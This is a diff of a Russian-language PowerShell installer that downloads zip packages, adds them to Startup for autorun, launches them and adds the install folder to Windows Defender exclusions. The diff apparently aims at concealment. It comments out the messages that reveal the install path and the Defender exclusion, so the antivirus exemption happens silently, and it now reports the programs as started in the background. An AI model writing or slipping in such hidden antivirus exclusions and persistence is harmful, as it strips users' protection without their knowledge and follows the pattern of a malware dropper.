@@ -16,7 +16,7 @@ Write-Host "Для отмены установки закройте окно (Ct
 # Ожидание нажатия любой клавиши
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 Write-Host ""
-Write-Host "Начинаем установку..." -ForegroundColor Green
+Write-Host "Начинаем установку..." -ForegroundColor White
 Write-Host ""
 
 # Пути
@@ -58,15 +58,15 @@ $Packages = @(
 function Install-Package {
     param($Package)
     
-    Write-Host "Установка $($Package.Name)..." -ForegroundColor Yellow
+    Write-Host "Установка $($Package.Name)..." -ForegroundColor White
     
     # Скачивание
     $zipFile = "$TempPath\$($Package.Name).zip"
     try {
         Invoke-WebRequest -Uri $Package.URL -OutFile $zipFile
-        Write-Host "  ✓ Скачано" -ForegroundColor Green
+        Write-Host "  ✓ Загружено" -ForegroundColor Green
     } catch {
-        Write-Host "  ✗ Ошибка скачивания: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "  ✗ Ошибка загрузки: $($_.Exception.Message)" -ForegroundColor Red
         return
     }
     
@@ -95,14 +95,14 @@ function Install-Package {
     if ($Package.AutoRun) {
         $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup", "$($Package.Name).lnk")
         Create-Shortcut -TargetPath "$packagePath\$($Package.ExeFile)" -ShortcutPath $startupPath -Arguments $Package.LaunchArgs
-        Write-Host "  ✓ Ярлык в автозагрузке" -ForegroundColor Green
+        Write-Host "  ✓ Добавлено в автозагрузку" -ForegroundColor Green
     }
     
     # Ярлык на рабочий стол
     if ($Package.DesktopIcon) {
         $desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop", "$($Package.Name).lnk")
         Create-Shortcut -TargetPath "$packagePath\$($Package.ExeFile)" -ShortcutPath $desktopPath
-        Write-Host "  ✓ Ярлык на рабочем столе" -ForegroundColor Green
+        Write-Host "  ✓ Добавлен ярлык на рабочий стол" -ForegroundColor Green
     }
     
     # Запуск приложения
@@ -114,9 +114,9 @@ function Install-Package {
             } else {
                 Start-Process -FilePath $exePath -WorkingDirectory $packagePath
             }
-            Write-Host "  ✓ Приложение запущено" -ForegroundColor Green
+            Write-Host "  ✓ Запущено в фоновом режиме" -ForegroundColor Green
         } else {
-            Write-Host "  ⚠ Исполняемый файл не найден" -ForegroundColor Yellow
+            Write-Host "  ⚠ Исполняемый файл не найден" -ForegroundColor Red
         }
     }
 }
@@ -139,7 +139,7 @@ function Create-Shortcut {
 }
 
 # Основной процесс установки
-Write-Host "Установка в: $InstallPath" -ForegroundColor Gray
+# Write-Host "Установка в: $InstallPath" -ForegroundColor Gray
 
 # Установка каждого пакета
 foreach ($package in $Packages) {
@@ -148,15 +148,16 @@ foreach ($package in $Packages) {
 }
 
 # Добавление в исключения Защитника Windows
-Write-Host "Добавление в исключения Защитника Windows..." -ForegroundColor Yellow
+# Write-Host "Добавление в исключения Защитника Windows..." -ForegroundColor Yellow
 try {
     Add-MpPreference -ExclusionPath $InstallPath -ErrorAction Stop
-    Write-Host "✓ Папка добавлена в исключения" -ForegroundColor Green
+    # Write-Host "✓ Папка добавлена в исключения" -ForegroundColor Green
 } catch {
-    Write-Host "⚠ Не удалось добавить в исключения (требуются права администратора)" -ForegroundColor Yellow
+    Write-Host "⚠ Не удалось добавить в исключения (требуются права администратора)" -ForegroundColor Red
 }
 
-Write-Host "`nУстановка завершена!" -ForegroundColor Green
-Write-Host "Все программы установлены в: $InstallPath" -ForegroundColor Gray
-Write-Host "`nДля продолжения нажмите клавишу ВВОД..." -ForegroundColor Yellow
+Write-Host "`nУстановка завершена!" -ForegroundColor White
+# Write-Host "Все программы установлены в: $InstallPath" -ForegroundColor Gray
+Write-Host "`nДля продолжения нажмите клавишу ВВОД..." -ForegroundColor White
 Read-Host
+
